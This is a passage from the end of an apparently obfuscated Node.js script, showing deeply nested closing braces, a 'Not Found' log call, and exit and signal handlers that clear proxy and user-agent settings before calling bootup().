                                                                            console.log(_0x301411 + " Not Found");
                                                                            sigma();
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  });
}
function clearall() {
  clearProxy();
  clearUserAgent();
}
process.on("exit", clearall);
process.on("SIGINT", () => {
  clearall();
  process.exit();
});
process.on('SIGTERM', () => {
  clearall();
  process.exit();
});
bootup();